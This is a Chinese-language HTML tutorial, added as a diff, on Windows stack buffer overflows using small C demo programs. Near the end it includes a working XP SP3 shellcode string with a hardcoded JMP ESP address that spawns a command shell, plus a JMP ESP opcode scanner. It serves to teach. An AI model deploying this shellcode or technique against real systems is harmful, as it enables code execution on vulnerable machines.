@@ -1,0 +1,732 @@
+﻿<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<base target="_blank" />
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title></title>
+<script type="text/javascript">
+var userAgent = navigator.userAgent.toLowerCase();
+var browser = 
+	(browser = userAgent.match(/qqbrowser\/([\d.]+)/))?"qqbrowser/"+browser[1]:
+	(browser = userAgent.match(/se\s+2.x/))?"sogou/2.x": //sougou
+	(browser = userAgent.match(/msie\s+([\d.]+)/))?"msie/"+browser[1]: //ie
+	(browser = userAgent.match(/chrome\/([\d.]+)/))?"chrome/"+browser[1]: //chrome
+	(browser = userAgent.match(/firefox\/([\d.]+)/))?"firefox/"+browser[1]: //firefox
+	(browser = userAgent.match(/version\/([\d.]+)\s+safari\/([\d.]+)/))?"safari/"+browser[1]: //safari
+	(browser = userAgent.match(/opera\/([\d.]+)([\w\W]+)version\/([\d.]+)/))?"opera/"+browser[3]: //opera
+	"other browser";
+	var browser4 = browser.substr(0,2);
+//实现回到页面顶部  
+function goTopEx(){  
+	var obj=document.getElementById("goTopBtn"); 
+	var obj2=document.getElementById("shangy"); 
+	var obj3=document.getElementById("xiay");
+	var obj4=document.getElementById("goBottom");  
+	
+	function getScrollTop(){  
+		if(browser4=="ch"){
+			//chrome
+			//chrome63.0.3239.132对DTD XHTML 1.0不再支持body.scrollTop属性，只支持documentElement.scrollTop 
+			return document.documentElement.scrollTop; 
+		}else{
+			//IE、firefox
+			return document.documentElement.scrollTop;  
+		}  
+	}
+	function setScrollTop(value){ 
+		if(browser4=="ch"){ 
+			//chrome
+			document.documentElement.scrollTop=value; 
+		}else{  
+			//IE、firefox
+			document.documentElement.scrollTop=value;  
+		} 
+	}     
+	window.onscroll=function(){getScrollTop()>50?obj.style.display="":obj.style.display="none";
+	getScrollTop()>100?obj2.style.display="":obj2.style.display="none";
+	document.body.clientHeight-getScrollTop()>650?obj3.style.display="":obj3.style.display="none";
+	document.body.clientHeight-getScrollTop()>650?obj4.style.display="":obj4.style.display="none";
+	}  
+	obj.onclick=function(){  
+		var goTop=setInterval(scrollMove,10);  
+		function scrollMove(){  
+				setScrollTop(getScrollTop()/1.1);  
+				if(getScrollTop()<1)clearInterval(goTop);  
+		}  
+	}  
+}  
+function downn(){
+	if(browser4=="ch"){
+		//chrome
+		window.scrollBy(0,document.body.clientHeight);
+	}else{
+		//IE、firefox
+		window.scrollBy(0,document.documentElement.clientHeight*1000); 
+	}
+}
+</script>
+<script>
+function changePage(){ 
+	var page = document.getElementById("container");
+	page.style.background="black";
+	page.style.color="white";
+	page.style.fontSize="22px";
+	page.style.fontFamily="MV boli";
+}
+document.write('<div style="position:fixed; right: 10px; top:20px; color:#eee;">背景颜色<br><select name=bcolor id=bcolor onchange="javascript:document.body.style.background=this.options[this.selectedIndex].value;"><option style="background-color: #ffffff" value="#ffffff">白色</option><option style="background-color: #f6f6f6" value="#f6f6f6">银灰</option><option style="background-color: #e4ebf1" value="#e4ebf1">淡蓝</option><option style="background-color: #e6f3ff" value="#e6f3ff">蓝色</option> <option style="background-color: #eeeeee" value="#eeeeee">淡灰</option><option style="background-color: #eaeaea" value="#eaeaea">灰色</option>  <option style="background-color: #e4e1d8" value="#e4e1d8">深灰</option><option style="background-color: #e6e6e6" value="#e6e6e6">暗灰</option><option style="background-color: #eefaee" value="#eefaee">绿色</option><option style="background-color: #ffffed" value="#ffffed">明黄</option><option style="background-color: #333333" value="#333333">黑色</option></select><br>字体颜色<br><select name=txtcolor id=txtcolor onchange="javascript:document.getElementById(\'container\').style.color=this.options[this.selectedIndex].value;"> <option value="#000000">黑色</option><option value="#ff0000" style="color:red;">红色</option><option value="#006600" style="color:green;">绿色</option><option value="#0000ff" style="color:blue;">蓝色</option><option value="#660000" style="color:#006600;">棕色</option><option value="#ffffff">白色</option></select><br>字体大小<br><select name=fontsize id=fonttype onchange="javascript:document.getElementById(\'container\').style.fontSize=this.options[this.selectedIndex].value;"> <option value="12px" >小号</option> <option value="14px" >较小</option> <option value="19px" >中号</option> <option value="19px" >默认</option><option value="22px" >较大</option><option value="25px" >大号</option><option value="35px" >35px</option><option value="45px" >45px</option><option value="55px" >55px</option><option value="65px" >65px</option><option value="75px" >75px</option><option value="85px" >85px</option><option value="95px" >95px</option></select>><br>字体类型<br><select name=fonttype id=fonttype onchange="javascript:document.getElementById(\'container\').style.fontFamily=this.options[this.selectedIndex].value;"> <option value="宋体" >宋体</option> <option value="MV boli" style="font-family:MV boli">MV boli</option> <option value="隶书" style="font-family:隶书">隶书</option> <option value="黑体" style="font-family:黑体">黑体</option><option value="楷体" style="font-family:楷体">楷体</option><option value="幼圆" style="font-family:幼圆">幼圆</option><option value="华文中宋" style="font-family:华文中宋">华文中宋</option><option value="华文行楷" style="font-family:华文行楷">华文行楷</option><option value="微软雅黑" style="font-family:微软雅黑">微软雅黑</option><option value="Arial" style="font-family:Arial">Arial</option><option value="Vrinda" style="font-family:Vrinda">Vrinda</option><option value="Tahoma" style="font-family:Tahoma">Tahoma</option><option value="Courier" style="font-family:Courier">Courier</option><option value="Times" style="font-family:Times">Times</option><option value="Georgia" style="font-family:Georgia">Georgia</option><option value="Lucida" style="font-family:Lucida">Lucida</option></select><br><a onClick="changePage()" target="_self" id="changepage">黑底白字</a></div>');   
+</script>
+<style type="text/css">
+#tbrowser a:linked container a:visited{
+	font-size:18px;
+	text-decoration:none;
+}
+a:link{
+	text-decoration:none;
+	}
+#container{
+	font-size:1.2em;
+	margin:auto;
+	font-family:"宋体";
+	width:65.29%;
+	line-height:1.6em;
+}
+P{
+	margin-top:16px;
+	margin-bottom:16px;
+	text-indent:2em;
+}
+.uls{
+	color:#CC6666;
+	font-weight:bold;
+}
+.uls>ol{
+	list-style:none;
+	font-weight:normal;
+	list-style:lower-latin;
+	color:#000000;
+	line-height:1.3em;
+}
+h2{
+	font-size:20px;
+	font-weight:bold;
+	margin-top:15px;
+	margin-bottom:0px;
+	text-indent:0em;
+}
+
+#goTopBtn, #goBottom, #shangy, #xiay, #ftsize1, #ftsize2, #ftsize3{
+	width: 18px;
+    line-height: 1.2;
+    padding: 5px 0;
+    font-size: 12px;
+    text-align: center;
+    position: fixed;
+	right: 10px;
+    cursor: pointer;
+    filter: Alpha(opacity=30);
+	opacity=.3;
+	font-weight:bold;
+}
+#goTopBtn, #goBottom, #ftsize1, #ftsize3  {
+    background-color:#999;
+    color:#000;
+}
+#shangy, #xiay, #ftsize2{
+    background-color: #bbb;
+    color: #000;
+}
+#ftsize1{
+	bottom:240px;
+}
+#ftsize2{
+	bottom:214px;
+}
+#ftsize3{
+	bottom:188px;
+}
+
+#goTopBtn{
+    bottom: 105px;
+}
+#goBottom {
+    bottom: 30px;
+}
+#shangy {
+    bottom: 80px;
+}
+#xiay {
+    bottom: 55px;
+}
+#goTopBtn:hover, #goBottom:hover, #shangy:hover, #xiay:hover, #ftsize1:hover, #ftsize2:hover, #ftsize3:hover{
+	background-color:#ccc;
+	border:#ccc 0px solid;
+}
+#goTopBtn a:link, #goBottom a:link, #xiay a:link, #shangy a:link, #ftsize1 a:link, #ftsize2 a:link, #ftsize3 a:link {
+	text-decoration: none;
+	color:white;
+}
+img{
+	margin-right:2em;
+	text-indent:2em;
+	border:0;
+}
+.picsay{
+	color:#930;
+	font-size:90%;
+	line-height:110%;
+	margin-top:-12px;
+	padding:0;
+}
+.remark{
+	color:#930;
+	font-size:90%;
+	line-height:140%;
+	margin-top:-12px;
+	text-indent:0em;
+	padding:0;
+}
+.ref{
+	color:#930;
+	font-size:95%;
+	line-height:150%;
+	margin-top:-12px;
+	text-indent:2em;
+	padding:0;
+}
+pre{
+	font-size:120%;
+	line-height:130%;
+	padding:0;
+	//background-color:#f6f6f6;
+	//background-color:#fff5ee;
+	//background-color:#ffe;
+	background-color:#eee;
+	padding:8px;
+	}
+.code0, .code2, .code4{
+	font-size:95%;
+	line-height:110%;
+	margin-top:-12px;
+	padding:0;
+	//background-color:#D9D1CA;
+	//background-color:#f6f6f6;
+	//background-color:#fff5ee;
+	background-color:#ffe;
+}
+.code0{
+	color:red;
+	text-indent:0em;
+}
+.code2{
+	color:#930;
+	text-indent:2em;
+}
+.code4{
+	color:blue;
+	text-indent:4em;
+}
+sub,sup{
+	font-size:80%;
+	color:red;
+}
+</style>
+</head>
+
+<body>
+
+<div id="container">
+<h4>1 缓冲区溢出介绍</h4>
+
+<p>缓冲区溢简单说，是大的数据存入了小缓冲区，又不对存入数据进行边界判断，最终导致小缓冲区被撑爆。大的数据污染了小缓冲区附近的内存。污染的内存可能带来改变程序控制流、夺取操作系统、禁止访问等多种结果。就好比一杯水，倒满了水，多余的就溢出到外面来了。</p>
+
+<p>缓冲区溢出主要可以分成三种：静态数据溢出、栈溢出和堆溢出。产生这三种不同的溢出根源在于win的内存结构；win的内存可以被分成两个层面：物理内存和虚拟内存。我们一般看到的其实只是windows的虚拟内存。在XP下windows会给所有进程都分配4G内存（无论物理内存真实多大）；windows会把4G内存分成代码区、数据区、堆区、栈区。数据区存储的是进程的全局变量。如果利用这里的数据进行缓冲区溢出那么就被称为静态数据溢出。同样利用栈区和堆区进行缓冲区溢出，则相应被称作栈溢出和堆溢出。静态数据溢出虽然技术难度低但是灵活性和可以利用范围低，所以本文就不介绍了。堆溢出相对复杂，将在别的文章介绍。本文介绍的是windows下的栈溢出，想要知道WINDOWS下的栈溢出如何利用，首先要理解windows下的栈结构。</p>
+
+<h4>2 栈工作原理</h4>
+
+<p>如上所示，想要知道WINDOWS下的栈溢出如何利用，首先要理解windows下的栈结构。</p>
+
+<p><img src="a_clip_image001.jpg" alt="https://images2015.cnblogs.com/blog/1124287/201703/1124287-20170326083740940-783640308.jpg" /></p>
+
+<p>如上图所示，栈其实是一种数据结构，它遵从先进后出的原则。这个先进后出的意思也很简单，就是说先存储进去的数据，会被放在最里边，而后面存入的，则依次向外，所以最先进去的，最后才能出来。进出都是同一个出口。</p>
+
+<p>形象一点说，就好比箱子放书，最先放进去的书总在最下面，而后面的书叠在上面。想要去最底层的书，就必须吧上面的书取出来。</p>
+
+<p>通过这张图，相信大家也能够更加容易的理解栈这个东西了。</p>
+
+<h4>3 实战c初探栈溢出</h4>
+
+<p>下面将简单介绍一下溢出的概念 </p>
+  <pre>
+#include "stdio.h" 
+#include "string.h" 
+#include "stdlib.h"
+char exp[] = "abcdef";
+int main() 
+{ 
+    char output[8]; 
+    strcpy(output,exp);  
+    int i=0; 
+    for(i=0;i&lt;8&&output[i];i++){ 
+        printf("\\0x%x",output[i]);
+    } 
+    printf("\n"); 
+    system("pause");
+    return 0;
+}
+</pre>
+  <p>关于其中的 for(int  i=0;i&lt;8&amp;&amp;output[i];i++)该程序的初值为0，终值为output[i]的函数，&amp;&amp;是与运算。</p>
+
+<p>因为char exp[] = &quot;abcdef&quot;;只赋值了6位。</p>
+
+<p>所以当i等于7时的值为空。</p>
+
+<p>从而导致循环为假。</p>
+
+<p>执行看看。</p>
+
+<p>\0x61\0x62\0x63\0x64\0x65\0x66</p>
+
+<p>没毛病。可以输出。</p>
+
+<p>这里说一下，这里转换的编码是字符的16进制。</p>
+
+<p>把abcdef都转换了61 62 63 64 65 66。</p>
+
+<p>当我们输入的exp数组值超过了8位会怎么样？ </p>
+<pre>
+#include "stdio.h" 
+#include "string.h" 
+#include "stdlib.h"
+int main()
+{
+    char exp[] = "abcdefghijk"; 
+    char output[8];
+    strcpy(output,exp);
+    int i=0;
+    for(i=0;i&lt;8&&output[i];i++){
+        printf("\\0x%x",output[i]);
+    } 
+    printf("\n"); 
+    system("pause");
+    return 0;
+}
+</pre>
+  <p>执行发现</p>
+
+<p><p>dev c++和vc++6下输出：\0x61\0x62\0x63\0x64\0x65\0x66\0x67\0x68</p>
+<p>单步调试发现output的内存空间情况：：0x0012ff34 "烫烫烫烫abcdefghijk"。</p>
+      <img src="a_clip_image004.jpg" alt="https://images2015.cnblogs.com/blog/1124287/201703/1124287-20170326100336690-435684931.jpg" /></p>
+
+<p>上面只输入了 </p>
+<p>\0x61\0x62\0x63\0x64\0x65\0x66\0x67\0x68 </p>
+<p>但是程序却出现了问题</p>
+
+<p><img src="a_clip_image005.jpg" alt="https://images2015.cnblogs.com/blog/1124287/201703/1124287-20170326100443721-1243989510.jpg" /></p>
+
+<p>可以看到只输出了8个字符，正好是字符空间的abcdefgh。</p>
+
+<h4>4 原理分析</h4>
+
+<p>那么是什么原因导致的程序结束的？</p>
+
+<p>下面给出了一个正常栈时的情况。</p>
+
+<p><img src="a_clip_image006.jpg" alt="https://images2015.cnblogs.com/blog/1124287/201703/1124287-20170326100658861-1115299870.jpg" />&nbsp;</p>
+
+<p>1. SP ( ESP ) </p>
+<p></p>
+<p>即栈顶指针，随着数据入栈出栈而发生变化</p>
+<p></p>
+<p>2. BP ( EBP )</p>
+<p></p>
+<p>即基地址指针，用于标识栈中一个相对稳定的位置。通过 BP ,可以方便地引用函数参数以及局部变量</p>
+<p></p>
+<p>3. IP ( EIP ) </p>
+<p></p>
+<p>即指令寄存器，在将某个函数的栈帧压入栈中时，其中就包含当前的 IP 值，即函数调用返回后下一个执行语句的地址</p>
+
+
+<p>eip：寄存器存放下一个CPU指令存放的内存地址，当CPU执行完当前指令后，从EIP寄存器中读取下一条指令的内存地址，然后继续执行。</p>
+  <p>原理因为程序要进入main函数，所以系统把之前的EIP和EBP保存在堆栈中，便于以后恢复，然后就是调用函数，调用函数的时候就把函数参数压入堆栈，后面再压入函数返回值之类的。</p>
+
+<h4>5 原理继续分析</h4>
+
+<p>当输入abcdefghijklmnop的时候。</p>
+
+<p><img src="a_clip_image007.jpg" alt="https://images2015.cnblogs.com/blog/1124287/201703/1124287-20170326101626815-604116809.jpg" /> </p>
+  <p>这个长度远远大于8，所以溢出的值覆盖了EBP和EIP的值，导致程序无法执行下一条指令的内存地址，最终导致程序无法正常运行。</p>
+
+<p>但是看图有没有发现，弹出的错误框告诉我们0x706f6e6d的地址不可读！！！</p>
+
+<p>0x706f6e6d &nbsp;？？？？</p>
+
+<p><img src="a_clip_image008.jpg" alt="https://images2015.cnblogs.com/blog/1124287/201704/1124287-20170429232542162-1473470569.jpg" /></p>
+
+<p>这不是mnop的字段么。</p>
+
+<p>原来是程序溢出的一段代码覆盖了我们的EBP和EIP 而堆栈又是以4字节为长度，由此算来，正好是mnop这四个字符溢出。</p>
+
+<p>所以，程序把我们的mnop当做指针来返回了，而0x706f6e6d这时又不可读，理所当然的就发生错误了~~</p>
+
+<p>那如果我们精心构造了一个地址呢~~？！</p>
+
+
+<h4>6 漏洞的利用，编写shellcode。</h4>
+
+<p>之前成功的了解了栈的原理及缓冲区溢出的一些基本概念。</p>
+
+<p>由于EIP被覆盖了，也就可以利用覆盖EIP的值为JMP ESP来跳转到我们的ESP指针所指向的地址。</p>
+
+<p><img src="a_clip_image009.jpg" alt="https://images2015.cnblogs.com/blog/1124287/201703/1124287-20170326111119315-1866569301.jpg" /></p>
+
+<p>这里我们是用的NNNN/JMP ESP/SSSS型的shellcode</p>
+
+<p>从上述可以知道N就是NOP，也就是为空字节，用来占据缓冲区的长度。</p>
+
+<p>然后JMP ESP就是我们的原EIP地址。</p>
+
+<p>s0开始就是我们那个上面的shellcode。</p>
+
+<p>那么为啥这样就能跳到shellcode里面去呢，我们知道程序执行完成之后esp会把返回地址弹到eip里面，而esp这个时候就指向了eip的下一位，也就是s0的位置，然后eip的地址里面是一条jmp esp指令，那么就很顺利的跳到esp指针的地方去了，如下图</p>
+
+<p><img src="a_clip_image010.jpg" alt="https://images2015.cnblogs.com/blog/1124287/201703/1124287-20170326143942721-1976876609.jpg" /> </p>
+  <p>执行RET之后。</p>
+
+<p>这时有人就会问，这里的RET是什么。</p>
+
+<p>RET相当于POP EIP，也就是把栈顶指针ESP所指向的值弹出来给EIP。所以通常，RET执行后，就可以把原来的EIP回复，从而回到中断前的流程。 </p>
+  <p><img src="a_clip_image011.jpg" alt="https://images2015.cnblogs.com/blog/1124287/201703/1124287-20170326144103033-673542402.jpg" /></p>
+
+<p>顺利跳过去执行我们的shellcode。</p>
+  <p>但由于JMP ESP的值是不确定的，当然有些版本是固定的。</p>
+
+<p>这里JMP ESP的地址，会由于版本的不同而不一样。比如在Win2000的User32.dll中，JMP ESP指令的地址分别为：sp0:0x77e2e32a、sp1:0x77e8898b、sp2:0x77e0492b、sp3:0x77e188a7、sp4:0x77e22c75。以前很多攻击利用程序需要带上对方版本的参数，就是这个原因。</p>
+
+<p>0x7ffa4512是lion分享的, 通杀中文2K,XP,2K3 . jmp esp ; 用0x7ffa4512吧, 2000, xp, 2003下通用。</p>
+
+<p>如果要想跳转地址更通用，这里推荐现在比较流行的两个：对Windows 2000、XP、2003都通用的具有JMP EBX功能的地址是0x7ffa1571，通用的具有JMP ESP功能的地址是0x7ffa4512。</p>
+
+<h4>7 简单的利用原理讲解</h4>
+
+<p>下面讲会讲解一个简单的跳转利用讲解~~</p>
+
+<p>本人是用的win测试的，而win7的JMP ESP找不到~~（技术欠缺咯）。</p>
+
+<p>是因为在WIN7以后,&nbsp;几个核心dll都是浮动地址加载的,&nbsp;没有统一的JMP&nbsp;ESP地址。</p>
+
+<p>看如下代码： </p>
+<pre>
+#include "stdio.h" 
+#include "windows.h" 
+void m()
+{
+    MessageBoxA(0, "hack by 神风", "hack", 0);
+}
+int main()
+{
+    printf("hello");
+    m();
+    system("pause");
+    return 0;
+}
+</pre>
+  <p>这里自定义了一个函数为m()函数。</p>
+
+<p>m函数的内容就是调用MessageBoxA()函数。</p>
+
+<p>也就是弹窗~~</p>
+  <p><img src="a_clip_image001_0000.jpg" alt="https://images2015.cnblogs.com/blog/1124287/201704/1124287-20170430111537897-1633999820.jpg" /></p>
+
+<p>当在主函数调用m()函数时，效果就是弹窗咯~</p>
+
+<p>那么，我们可不可同样，找到这个m()函数的地址，然后JMP到m()函数那去。</p>
+
+<p>我们可以用一个printf的%p来输出m()函数在内存中的地址。 </p>
+<pre>
+#include "stdio.h" 
+#include "windows.h" 
+void m()
+{
+    MessageBoxA(0, "hack by 神风", "hack", 0);
+}
+int main()
+{
+    printf("0x%p",&m);
+    system("pause");
+    return 0;
+}
+//0x00401005
+</pre>
+
+<p>可以知道地址为0x00401005，类似的，我们就可以利用这个地址来代理EIP的值，就会返回到我们的m()函数中去了！</p>
+
+<h4>8 最后的完工</h4>
+
+<p>到了最后一步了，只需要把我们的shellcode写出来就可以了。</p>
+
+<p>代码如下： </p>
+<pre>
+#include "stdio.h" 
+#include "string.h" 
+#include "stdlib.h" 
+#include "windows.h"
+char exp[] = "abcdefss" 
+"AAAA" 
+"\x05\x10\x40\x00";
+void m(){
+    MessageBoxA(0, "hack by 神风", "hack", 0);
+}
+
+#if(0)
+int main()
+{
+    char output[8];
+    strcpy(output,exp);
+    int i=0;
+    for(i=0;i&lt;8&&output[i];i++)
+        printf("\\0x%x",output[i]);
+    printf("\n");
+    return 0;    
+}
+#endif
+int main()
+{
+    char output[8] = {0};
+    //int * 取地址      （int）强制转为int
+    *(int *)((int)output+12) = (int)(int *) (m);
+    int i=0;
+    for(i=0;i&lt;8&&output[i];i++)
+        printf("\\0x%x",output[i]);
+    printf("\n");
+    return 0;    
+}
+</pre>
+  <p>这时候可以看到我们并没有在主函数中调用m()函数。</p>
+
+<p>但还是成功执行了m()函数。</p>
+
+<p><img src="a_clip_image003_0000.jpg" alt="https://images2015.cnblogs.com/blog/1124287/201704/1124287-20170430112747475-1738907927.jpg" /> </p>
+  <p>&nbsp;</p>
+  <p>最后放上一个XP SP3成功利用的代码。</p>
+
+<p>下面利用一个代码（XP SP3下通过，效果与上面的程序一样） </p>
+<pre>
+#include &lt;stdio.h>
+#include &lt;string.h>
+char name[] =
+"\x41\x41\x41\x41" 
+"\x41\x41\x41\x41"  //这里填充8字节把缓冲区填满 
+"\x41\x41\x41\x41"  //ebp填掉 
+"\x12\x45\xfa\x7f"  //eip覆盖成jmp esp的地址，这个是sp3下的地址 
+"\x55\x8B\xEC\x33\xC0\x50\x50\x50" //这里开始就是shellcode
+"\xC6\x45\xF4\x4D"
+"\xC6\x45\xF5\x53"
+"\xC6\x45\xF6\x56"
+"\xC6\x45\xF7\x43"
+"\xC6\x45\xF8\x52"
+"\xC6\x45\xF9\x54"
+"\xC6\x45\xFA\x2E"
+"\xC6\x45\xFB\x44"
+"\xC6\x45\xFC\x4C"
+"\xC6\x45\xFD\x4C"
+"\x8D\x45\xF4\x50\xBA\x7B\x1D\x80\x7C\xFF\xD2"
+"\x55\x8B\xEC\x83\xEC\x2C\xB8\x63\x6F\x6D\x6D"
+"\x89\x45\xF4\xB8\x61\x6E\x64\x2E"
+"\x89\x45\xF8\xB8\x63\x6F\x6D\x22"
+"\x89\x45\xFC\x33\xD2\x88\x55\xFF"
+"\x8D\x45\xF4\x50\xB8\xC7\x93\xBF\x77\xFF\xD0";
+int main()
+{
+    char output[8];
+    strcpy(output, name);
+    for(int i=0;i&lt;8&&output[i];i++)
+        printf("\\0x%x",output[i]);
+    return 0;
+}
+</pre>
+<p>最后再放上一个查看JMP ESP的C源代码：</p>
+<pre>
+#include&lt;windows.h>
+#include&lt;iostream.h>
+#include&lt;tchar.h>
+int getJmpEsp(TCHAR *ucDllName)
+{
+    HINSTANCE h;
+    
+    h = GetModuleHandle(ucDllName);
+    if(h == NULL)
+    {
+        h = LoadLibrary(ucDllName);
+        if(h == NULL)
+        {
+            cout&lt;&lt;"ERROR LOADING DLL:"&lt;&lt;ucDllName&lt;&lt;endl;
+            return -1;
+        }
+    }
+    BYTE* ptr=(BYTE*)h;
+    bool done=false;
+    for(int y=0;!done;y++)
+    {
+        try 
+        {
+            if(ptr[y] == 0xFF && ptr[y+1] == 0xE4)
+            {
+                int pos=(int)ptr + y;
+                cout&lt;&lt;"OPCODE found at 0x"&lt;&lt;hex&lt;&lt;pos&lt;&lt;endl;
+            }
+        }catch(...)
+        {
+            cout&lt;&lt;"END OF "&lt;&lt;ucDllName&lt;&lt;" MEMORY REACHED"&lt;&lt;endl;
+            done=true;
+        }
+    }
+    FreeLibrary(h);
+    return 0;
+}
+int main()
+{
+    getJmpEsp("ntdll");
+    getJmpEsp("user32");
+    system("pause");
+    return 0;
+    
+}
+</pre>
+  <p>参考书籍：</p>
+
+<p>《Q版缓冲区溢出》</p>
+
+<p>《汇编语言》 </p>
+  <p>&nbsp;</p>
+  <p>我在写本帖时遇到了些难题，印象最深的是一个编译器的问题</p>
+
+<p>如图</p>
+
+<p><img src="a_clip_image004_0000.jpg" alt="https://images2015.cnblogs.com/blog/1124287/201704/1124287-20170430114043147-995972832.jpg" /></p>
+
+<p>我们的溢出程序在DEVC++中是可以安全运行的，当时我一脸懵逼~~~</p>
+
+<p>一直以为是代码写错了。</p>
+
+<p>最后调试知道是不同的编译器的编译原理不同，而这种差错导致该代码成功执行。</p>
+
+<p>原因就是在于strcpy(output,exp);函数，并没有把所有的exp数组复制过来。而是复制了前8个，正好填满了OUTPUT~~</p>
+
+<p><img src="a_clip_image005.gif" alt="https://images2015.cnblogs.com/blog/1124287/201704/1124287-20170430114337475-682005627.png" /></p>
+
+<p>最后用VC++是可以成功溢出的 </p>
+  <p>&nbsp;</p>
+  <p>还有一个就是我在写代码时，把char exp[] = &quot;abcdef&quot;这串代码写到main外面</p>
+
+<p>我就想能不能写里面~~~</p>
+
+<p>结果两个编译器DEVC++和VC++都无法溢出！</p>
+
+<p><img src="a_clip_image006_0000.jpg" alt="https://images2015.cnblogs.com/blog/1124287/201704/1124287-20170430114629225-1580272818.jpg" /></p>
+
+<p>这里某大牛给出的解答是：</p>
+
+<p>&quot;把exp定义在main函数里相当于在main函数入口为exp开辟了11字节缓冲区，你strcpy以后还覆盖不到栈底当然不会溢出了&quot;。</p>
+  <p>&nbsp;</p>
+</div>
+
+
+<div>
+<a id="ftsizea" onclick='document.getElementById("container").style.fontSize = "1.4em";' target="_self" style="color:#fff;" title="大：1.4em"><div id="ftsize1" style="color:#fff;">大</div></a>
+<a id="ftsizea" onclick='document.getElementById("container").style.fontSize = "1.2em";' target="_self" style="color:#fff;" title="中：1.2em"><div id="ftsize2" style="color:#fff;">中</div></a>
+<a id="ftsizea" onclick='document.getElementById("container").style.fontSize = "1.0em";' target="_self" style="color:#fff;" title="小：1em"><div id="ftsize3" style="color:#fff;">小</div></a>
+
+<a target="_self" style="color:#fff;"><div style="display:none; color:#fff;" id="goTopBtn">&and;</div></a>
+<a onclick="shangy()" target="_self" style="color:#fff;"><div style="display:none; color:#fff;" id="shangy">&uarr;</div></a>
+<a onclick="xiay()" target="_self" style="color:#fff;"><div id="xiay" style="color:#fff;">&darr;</div></a>
+<a onclick="downn()" target="_self" style="color:#fff;"><div id="goBottom" style="color:#fff;">&or;</div></a>
+<script type=text/javascript>
+	goTopEx();
+	function xiay(){
+		window.scrollBy(0,window.innerHeight-10);
+	}
+	function shangy(){
+		window.scrollBy(0,-window.innerHeight+10);
+	}
+	var obj3=document.getElementById("xiay");
+	var obj4=document.getElementById("goBottom");
+	function getHeight(){  
+		if(browser4=="ch"){
+			//谷歌浏览器
+			return document.body.clientHeight; 
+		}else{
+			//IE、firefox等浏览器 
+			return document.documentElement.clientHeight;  
+		}  
+	}
+	getHeight()<window.innerHeight+50?obj3.style.display="none":obj3.style.display="";
+	getHeight()<window.innerHeight+50?obj4.style.display="none":obj4.style.display="";
+	if(browser4!="ch"){	//firefox需要尝一下才显示向下图标
+		xiay();
+		shangy();
+	}
+</script>
+</div>
+
+</body>
+</html>
+
+<!--
+_____________________________________________________________________________________
+
+1 段落替换
+\s*</p>
+
+<p>\s*
+------------------
+</p>
+
+<p>
+_____________________________________________________________________________________
+2 汉字中间的空格替换：
+([\u4e00-\u9fa5])\s+([\u4e00-\u9fa5])
+([^\s\*^{}"^u4e00-u9fa5])\s+([^\s\*^{}"^u4e00-u9fa5])
+
+
+------------------
+$1$2
+_____________________________________________________________________________________
+3 段落前的空格替换
+\s*</p>\s*
+\s*<p>\s*
+------------------
+</p>
+
+<p>
+_____________________________________________________________________________________
+
+4 把第和章两个字去掉
+第(\S*)章
+------------------
+$1
+_____________________________________________________________________________________
+
+7 正则表达式参考：
+https://www.toutiao.com/i6370960744082571778/
+_____________________________________________________________________________________
+
+8
+<p class="picsay">
+<p class="picsay">
+<p class="code0">
+<p class="code2">
+<p class="code4">
+_____________________________________________________________________________________
+9 将标注序号更改为上标，红色，需一个个替换，英文html中有[1]
+(\[\d\])
+------------------
+<sup>$1</sup>
+_____________________________________________________________________________________
+10 替换章不是以1-9。?！…”“结尾的段落
+([^1-90。?！…”：？“章])</p>
+<p>
+------------------
+$1
+-->
+
+
